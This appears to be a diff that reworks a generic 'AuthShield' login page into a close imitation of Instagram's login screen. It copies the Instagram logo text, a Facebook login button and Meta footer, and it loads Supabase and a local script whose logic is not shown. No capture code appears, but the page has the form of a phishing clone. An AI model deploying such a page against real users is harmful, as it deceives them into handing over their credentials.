@@ -4,99 +4,114 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="output.css" />
-    <title>Login</title>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      rel="stylesheet"
+    />
+    <title>Login • Instagram</title>
   </head>
-  <body>
-    <div
-      class="min-h-screen bg-gray-50 flex items-center justify-center antialiased font-sans p-4"
-    >
+  <body
+    class="bg-gray-50 flex flex-col min-h-screen justify-center items-center antialiased font-sans p-4"
+  >
+    <!-- Main Container -->
+    <div class="w-full max-w-[350px] flex flex-col gap-2.5 relative">
+      <!-- Primary Card -->
       <div
-        class="w-full max-w-sm bg-white border border-gray-200 rounded-xl p-6 shadow-sm"
+        class="bg-white border border-gray-300 rounded-[1px] pt-10 pb-6 px-10 flex flex-col items-center relative"
       >
-        <!-- App Header Branding -->
-        <div class="flex items-center gap-2 mb-6 justify-center">
-          <div
-            class="w-7 h-7 bg-black rounded flex items-center justify-center text-white font-bold text-sm"
-          >
-            A
-          </div>
-          <span class="font-bold text-gray-900 tracking-tight">AuthShield</span>
-        </div>
+        <!-- Back Button -->
+        <a
+          href="javascript:history.back()"
+          class="absolute top-4 left-4 text-gray-700 hover:text-black transition text-lg"
+          title="Go Back"
+        >
+          <i class="fas fa-arrow-left"></i>
+        </a>
 
-        <div class="space-y-1 mb-6 text-center">
-          <h1 class="text-xl font-bold tracking-tight text-gray-900">
-            Welcome back
-          </h1>
-          <p class="text-xs text-gray-500">
-            Sign in to access your secure dashboard workspace.
-          </p>
-        </div>
+        <!-- Logo -->
+        <h1
+          class="text-3xl font-serif italic font-semibold mb-8 tracking-wide text-gray-900 select-none cursor-default"
+          style="font-family: &quot;Grand Hotel&quot;, cursive, sans-serif"
+        >
+          Instagram
+        </h1>
 
-        <form action="" onsubmit="return false;">
-          <div class="space-y-4">
-            <div>
-              <label
-                for="emailAddress"
-                class="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1.5"
-              >
-                Email Address
-              </label>
-              <input
-                type="email"
-                id="emailAddress"
-                placeholder="name@company.com"
-                required
-                class="w-full px-3 py-2 border border-gray-200 rounded text-sm bg-gray-50 focus:bg-white focus:outline-none focus:ring-1 focus:ring-black focus:border-black transition"
-              />
-            </div>
+        <!-- Form Interface -->
+        <form class="w-full space-y-1.5" onsubmit="return false;">
+          <input
+            type="email"
+            id="emailAddress"
+            placeholder="Phone number, username, or email"
+            required
+            class="w-full px-2 py-2 border border-gray-200 bg-gray-50 rounded-[3px] text-xs focus:outline-none focus:border-gray-400 placeholder-gray-400 text-gray-800 transition"
+          />
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            required
+            class="w-full px-2 py-2 border border-gray-200 bg-gray-50 rounded-[3px] text-xs focus:outline-none focus:border-gray-400 placeholder-gray-400 text-gray-800 transition"
+          />
 
-            <div>
-              <div class="flex items-center justify-between mb-1.5">
-                <label
-                  for="password"
-                  class="block text-xs font-semibold uppercase tracking-wider text-gray-400"
-                >
-                  Password
-                </label>
-                <a
-                  href="#"
-                  class="text-[11px] text-gray-400 hover:text-black font-medium transition"
-                >
-                  Forgot?
-                </a>
-              </div>
-              <input
-                type="password"
-                id="password"
-                placeholder="••••••••"
-                required
-                class="w-full px-3 py-2 border border-gray-200 rounded text-sm bg-gray-50 focus:bg-white focus:outline-none focus:ring-1 focus:ring-black focus:border-black transition"
-              />
-            </div>
-
-            <div class="pt-2">
-              <button
-                type="submit"
-                class="w-full bg-black text-white hover:bg-gray-800 text-sm font-semibold py-2.5 px-4 rounded transition-all tracking-tight"
-              >
-                Sign In
-              </button>
-            </div>
+          <div class="pt-2">
+            <button
+              type="submit"
+              class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white text-sm font-semibold py-1.5 rounded-[4px] transition-all tracking-wide"
+            >
+              Log in
+            </button>
           </div>
         </form>
 
-        <div class="mt-6 pt-4 border-t border-gray-100 text-center">
-          <p class="text-xs text-gray-500">
-            Don't have an account?
-            <a
-              href="register.html"
-              class="text-black font-semibold hover:underline"
-              >Register</a
-            >
-          </p>
+        <!-- Divider Line Layout -->
+        <div class="w-full flex items-center justify-between my-5">
+          <div class="h-[1px] bg-gray-200 w-full"></div>
+          <span
+            class="text-[12px] font-semibold text-gray-400 uppercase mx-4 tracking-wider"
+            >OR</span
+          >
+          <div class="h-[1px] bg-gray-200 w-full"></div>
         </div>
+
+        <!-- Meta Login Options & Forgot Account -->
+        <button
+          class="flex items-center gap-2 text-[#385185] font-semibold text-sm mb-4 hover:opacity-80"
+        >
+          <i class="fab fa-facebook-square text-lg"></i> Log in with Facebook
+        </button>
+
+        <a href="#" class="text-[12px] text-[#00376b] hover:underline mt-2"
+          >Forgot password?</a
+        >
+      </div>
+
+      <!-- Secondary Card (Redirect Switch) -->
+      <div
+        class="bg-white border border-gray-300 rounded-[1px] py-6 text-center text-sm text-gray-800"
+      >
+        Don't have an account?
+        <a
+          href="register.html"
+          class="text-[#0095f6] font-semibold hover:underline"
+          >Sign up</a
+        >
       </div>
     </div>
+
+    <!-- Footer Menu Styling -->
+    <footer
+      class="mt-16 text-[12px] text-gray-400 flex flex-wrap justify-center gap-4 max-w-lg text-center px-4"
+    >
+      <a href="#" class="hover:underline">Meta</a>
+      <a href="#" class="hover:underline">About</a>
+      <a href="#" class="hover:underline">Blog</a>
+      <a href="#" class="hover:underline">Jobs</a>
+      <a href="#" class="hover:underline">API</a>
+      <a href="#" class="hover:underline">Privacy</a>
+      <a href="#" class="hover:underline">Terms</a>
+      <p class="w-full mt-2 text-gray-400">© 2026 Instagram from Meta</p>
+    </footer>
+
     <!-- Connect to Supabase CDN and custom logic -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="index.js"></script>
